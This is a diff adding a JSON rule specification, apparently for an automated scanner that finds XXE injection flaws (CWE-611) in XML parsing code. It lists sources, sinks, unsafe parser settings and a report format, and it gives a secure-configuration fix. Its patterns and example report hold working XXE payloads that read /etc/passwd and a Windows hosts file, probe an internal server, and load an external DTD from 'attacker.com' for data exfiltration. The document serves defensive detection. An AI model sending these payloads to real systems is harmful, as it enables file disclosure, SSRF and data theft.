@@ -1,0 +1,47 @@
+{
+  "title": "XXE (XML External Entity) Injection Detection (CWE-611)",
+  "objective": "Identify exploitable XXE injection vulnerabilities by analyzing XML processing that allows external entity references, enabling attackers to read local files, perform SSRF attacks, or cause denial of service through entity expansion. Report only confirmed paths where malicious XML can trigger external entity processing with high confidence in file disclosure or system compromise.",
+  "method": {
+    "sources": ["XML file uploads", "SOAP requests", "REST API XML", "Configuration files", "RSS/Atom feeds", "SVG uploads", "Office documents", "XML-RPC calls", "SAML assertions"],
+    "flow": "Trace XML input through parsing libraries to identify processors that resolve external entities without proper restrictions",
+    "sinks": ["XML parsers", "DOM builders", "SAX parsers", "XSLT processors", "XML Schema validators", "SOAP handlers", "RSS readers", "Document converters"],
+    "validation": "Exclude if external entities are disabled, custom resolvers block external access, or secure XML parser configuration is used"
+  },
+  "patterns": {
+    "external_entity_enabled": ["DocumentBuilderFactory without setFeature(XMLConstants.FEATURE_SECURE_PROCESSING)", "SAXParserFactory with external entities enabled"],
+    "dtd_processing": ["factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', false)", "DTD processing enabled"],
+    "xml_parser_unsafe": ["XMLInputFactory.newInstance() without security features", "Unmarshaller without XXE protection"],
+    "soap_xxe": ["SOAP message processing without XXE protection", "JAX-WS with vulnerable XML parsing"],
+    "file_disclosure": ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>", "<!ENTITY xxe SYSTEM 'file:///c:/windows/system32/drivers/etc/hosts'>"],
+    "ssrf_xxe": ["<!ENTITY xxe SYSTEM 'http://internal.server/admin'>", "external entity pointing to internal URLs"],
+    "billion_laughs": ["<!ENTITY lol 'lol'> recursive entity expansion", "exponential entity expansion DoS"],
+    "parameter_entities": ["<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>", "parameter entity for data exfiltration"],
+    "svg_xxe": ["SVG files with embedded XXE", "<svg xmlns:xlink with external entities"],
+    "office_xxe": ["Excel/Word documents with XXE", "OpenXML format exploitation"]
+  },
+  "report_format": {
+    "file": "path:line",
+    "type": "External_Entity_Enabled|DTD_Processing|XML_Parser_Unsafe|SOAP_XXE|File_Disclosure|SSRF_XXE",
+    "source": "xml_upload|soap_request|rest_xml|config_file|rss_feed",
+    "sink": "xml_parser|dom_builder|sax_parser|xslt_processor|soap_handler",
+    "flow": "xml_input→xml_parsing→external_entity_resolution→file_access_or_ssrf",
+    "code": "DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); DocumentBuilder builder = factory.newDocumentBuilder(); Document doc = builder.parse(userXmlInput);",
+    "payload": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
+    "fix": "Disable external entities: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true);"
+  },
+  "rules": [
+    "Trace XML input to parsing operations with exact line numbers and parser configuration",
+    "Provide specific XXE payload demonstrating file disclosure or SSRF attack",
+    "Suggest secure XML parsing configuration (disable external entities, DTD processing, secure features)",
+    "Verify XML processing context determines XXE risk (file uploads vs API endpoints vs configuration)",
+    "Apply high confidence threshold; ignore if secure XML parser configuration or external entity blocking detected",
+    "Consider both direct XXE and blind XXE where responses aren't directly returned",
+    "Flag file upload functionality and SOAP services as high-risk XXE vectors",
+    "Analyze different XML parsing libraries and their default security configurations",
+    "Check for XXE in document processing (PDF, Office docs) and image formats (SVG)",
+    "Identify cases where XXE could lead to sensitive file disclosure, SSRF, or denial of service",
+    "Consider enterprise applications using SOAP, SAML, RSS feeds, and configuration files",
+    "Focus on Java, .NET, PHP, and Python applications with XML processing capabilities",
+    "Analyze both server-side XML processing and any client-side XML parsing that could affect security"
+  ]
+}
